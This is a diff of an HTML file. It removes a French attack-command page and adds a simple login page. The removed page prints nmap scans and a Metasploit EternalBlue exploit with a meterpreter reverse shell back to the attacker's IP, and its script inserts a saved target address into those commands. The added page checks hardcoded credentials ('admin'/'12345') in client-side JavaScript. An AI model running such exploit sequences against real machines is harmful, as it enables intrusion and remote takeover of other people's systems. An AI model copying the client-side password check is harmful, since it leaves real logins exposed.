@@ -1,139 +1,86 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test d'IP et Commandes</title>
+    <title>Connexion</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            color: #333;
-            margin: 0;
-            padding: 0;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             height: 100vh;
+            background-color: #f4f4f4;
         }
-        h1 {
-            color: #4CAF50;
-        }
-        .container {
-            background-color: white;
+        .login-container {
+            background: #fff;
             padding: 20px;
-            border-radius: 10px;
+            border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 80%;
-            max-width: 600px;
+            width: 300px;
         }
-        .input-section, .commands-section {
+        h2 {
+            text-align: center;
             margin-bottom: 20px;
         }
-        textarea {
+        input {
             width: 100%;
             padding: 10px;
-            margin-top: 10px;
-            border-radius: 5px;
-            border: 1px solid #ddd;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
         button {
-            background-color: #4CAF50;
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+            border-radius: 4px;
             cursor: pointer;
         }
         button:hover {
-            background-color: #45a049;
+            background-color: #0056b3;
         }
-        .embed-section {
-            margin-top: 20px;
+        .error {
+            color: red;
+            text-align: center;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <h1>Outils de Test d'IP et Commandes</h1>
-        
-        <!-- Section pour récupérer l'adresse IP de la passerelle -->
-        <div class="input-section">
-            <h2>Commande pour récupérer l'adresse IP de la passerelle</h2>
-            <pre id="ipCommand">
-                ip route | grep default
-            </pre>
-        </div>
-
-        <!-- Section pour coller un mot et le sauvegarder localement -->
-        <div class="input-section">
-            <h2>Collez un mot à sauvegarder</h2>
-            <textarea id="wordInput" placeholder="Entrez un mot à sauvegarder..."></textarea>
-            <button onclick="saveWord()">Sauvegarder</button>
-            <p id="savedWordDisplay">Mot sauvegardé : <span id="savedWord"></span></p>
-        </div>
-
-        <!-- Section pour afficher des commandes d'attaque (éthique) -->
-        <div class="commands-section">
-            <h2>Commandes pour tester le réseau</h2>
-            <p>Exécuter un scan Nmap :</p>
-            <pre id="nmapCommand">
-                nmap -p 1-65535 -sV [adresse_ip_du_client]
-            </pre>
-            <p>Exécuter un scan des vulnérabilités :</p>
-            <pre id="nmapVulnCommand">
-                nmap --script vuln [adresse_ip_du_client]
-            </pre>
-            <p>Exploitation via Metasploit :</p>
-            <pre id="metasploitCommand">
-                msfconsole
-                use exploit/windows/smb/ms17_010_eternalblue
-                set RHOSTS [adresse_ip_du_serveur]
-                set PAYLOAD windows/x64/meterpreter/reverse_tcp
-                set LHOST [votre_ip_publique]
-                set LPORT 4444
-                run
-            </pre>
-        </div>
+    <div class="login-container">
+        <h2>Connexion</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Nom d'utilisateur" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+            <p id="errorMessage" class="error" style="display:none;">Nom d'utilisateur ou mot de passe incorrect.</p>
+        </form>
     </div>
 
     <script>
-        // Charger le mot sauvegardé à partir du localStorage si existant
-        document.addEventListener('DOMContentLoaded', function() {
-            const savedWord = localStorage.getItem('savedWord');
-            if (savedWord) {
-                document.getElementById('savedWord').textContent = savedWord;
-                updateCommands(savedWord); // Mettre à jour les commandes
+        const correctUsername = "admin"; // Nom d'utilisateur correct
+        const correctPassword = "12345"; // Mot de passe correct (simple pour le test)
+
+        const loginForm = document.getElementById("loginForm");
+        const errorMessage = document.getElementById("errorMessage");
+
+        loginForm.addEventListener("submit", function (e) {
+            e.preventDefault(); // Empêche le rechargement de la page
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            if (username === correctUsername && password === correctPassword) {
+                alert("Connexion réussie !");
+                errorMessage.style.display = "none";
+            } else {
+                errorMessage.style.display = "block";
             }
         });
-
-        // Sauvegarder le mot dans localStorage et mettre à jour les commandes
-        function saveWord() {
-            const word = document.getElementById('wordInput').value;
-            if (word.trim() !== "") {
-                localStorage.setItem('savedWord', word);
-                document.getElementById('savedWord').textContent = word;
-                updateCommands(word);  // Met à jour les commandes avec le mot sauvegardé
-            } else {
-                alert("Veuillez entrer un mot.");
-            }
-        }
-
-        // Fonction pour mettre à jour les commandes avec le mot sauvegardé
-        function updateCommands(word) {
-            // Récupération des éléments de commande
-            const nmapCommand = document.getElementById('nmapCommand');
-            const nmapVulnCommand = document.getElementById('nmapVulnCommand');
-            const metasploitCommand = document.getElementById('metasploitCommand');
-
-            // Mise à jour des commandes en remplaçant les espaces réservés par le mot sauvegardé
-            nmapCommand.textContent = `nmap -p 1-65535 -sV ${word}`;
-            nmapVulnCommand.textContent = `nmap --script vuln ${word}`;
-            metasploitCommand.textContent = `msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS ${word}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST [votre_ip_publique]\nset LPORT 4444\nrun`;
-        }
     </script>
-
 </body>
 </html>
